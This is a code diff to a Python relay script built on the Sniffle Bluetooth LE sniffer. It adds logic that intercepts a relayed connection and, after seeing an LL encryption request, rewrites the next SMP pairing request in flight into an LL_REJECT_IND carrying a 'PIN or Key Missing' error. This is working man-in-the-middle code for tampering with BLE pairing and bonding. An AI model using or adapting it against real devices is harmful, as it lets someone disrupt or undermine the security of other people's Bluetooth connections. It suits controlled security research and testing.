@@ -14,10 +14,16 @@ from sniffle.sniffle_hw import (SniffleHW, BLE_ADV_AA, PacketMessage, DebugMessa
                                 MeasurementMessage, SnifferMode)
 from sniffle.packet_decoder import DPacketMessage, ConnectIndMessage, LlDataContMessage
 from sniffle.relay_protocol import connect_relay, MessageType
+from sniffle.packet_decoder import DPacketMessage, DataMessage, LlDataContMessage, \
+        AdvIndMessage, AdvDirectIndMessage, ScanRspMessage, ConnectIndMessage, \
+        str_mac, LlControlMessage, AdvertMessage
 
 # global variable to access hardware
 hw = None
 _aa = 0
+
+bonding = True
+seen_pairing_req = False
 
 def sigint_handler(sig, frame):
     hw.cancel_recv()
@@ -140,6 +146,9 @@ def sock_recv_print_forward(conn):
     print(pkt, end='\n\n')
 
 def ser_recv_print_forward(conn, quiet):
+    global bonding 
+    global seen_pairing_req
+
     msg = hw.recv_and_decode()
     print_message(msg, quiet)
 
@@ -148,6 +157,31 @@ def ser_recv_print_forward(conn, quiet):
         return
 
     msg = DPacketMessage.decode(msg)
+    empty = isinstance(msg, LlDataContMessage) and msg.data_length == 0
+
+    if isinstance(msg, LlControlMessage) and msg.opcode == 0x03 and bonding:
+        print("LL_ENC_REQ seen, this means that next pairing request should be modified \n")
+        seen_pairing_req = True
+        LLENCREQ_event = msg.event
+        # Replace LL_ENC_RSP with LL_REJECT_IND if bonding is set
+    if not empty and isinstance(msg, PacketMessage):
+        if is_smp_pairing_req(msg.body) and seen_pairing_req: 
+            print("[MODIFY] Replacing Pairing request with LL_REJECT_IND (PIN or Key Missing)")
+
+            # Change opcode field in message object
+            msg.opcode = 0x0D  # LL_REJECT_IND
+            msg.payload = bytes([0x06])  # Error code: PIN or Key Missing
+
+            # Modify body while preserving NESN/SN/MD flags
+            old_hdr = msg.body[0] if len(msg.body) > 0 else 0x00
+            llid_masked = (old_hdr & 0b11111100) | 0b11  # LLID = 0b11 (LL Control PDU)
+
+            new_len = 2  # Payload: opcode + error code
+            new_opcode = 0x0D
+            error_code = 0x06
+
+            msg.body = bytes([llid_masked, new_len, new_opcode, error_code])
+            print(f"  Final msg.body = {msg.body.hex()}")
 
     # don't forward empty packets
     is_empty = isinstance(msg, LlDataContMessage) and msg.data_length == 0
@@ -169,6 +203,43 @@ def print_packet(pkt, quiet=False):
     if quiet and isinstance(dpkt, LlDataContMessage) and dpkt.data_length == 0:
         return
     print(dpkt, end='\n\n')
+
+
+# Assuming these exist somewhere in your code:
+# _SMP_CID = 0x0006
+# _SMP_PAIRING_REQ = 0x01
+
+def is_smp_pairing_req(ll_body: bytes) -> bool:
+    print(ll_body)
+    _SMP_CID = 0x0006
+    _SMP_PAIRING_REQ = 0x01
+    _SMP_PAIRING_RSP = 0x02
+    _MIC_LEN = 4  
+    # Need at least LL header + minimal L2CAP header
+    if len(ll_body) < 4:
+        return False
+
+    # LL data PDU: bits 0-1 are LLID
+    llid = ll_body[0] & 0x03
+    length = ll_body[1]
+
+    # Must be LL Data PDU with full payload present
+    if llid != 0x02 or len(ll_body) < 2 + length or length < 4:
+        return False
+
+    # L2CAP header at offset 2
+    l2cap = ll_body[2:2+length]
+    l2len = l2cap[0] | (l2cap[1] << 8)
+    cid   = l2cap[2] | (l2cap[3] << 8)
+
+    # Must be SMP CID and have enough bytes for a pairing message
+    if cid != _SMP_CID or l2len < 7 or len(l2cap) < 4 + l2len:
+        return False
+
+    # SMP PDU: first byte is the SMP code
+    smp_code = l2cap[4]
+    return smp_code == _SMP_PAIRING_REQ
+
 
 if __name__ == "__main__":
     main()
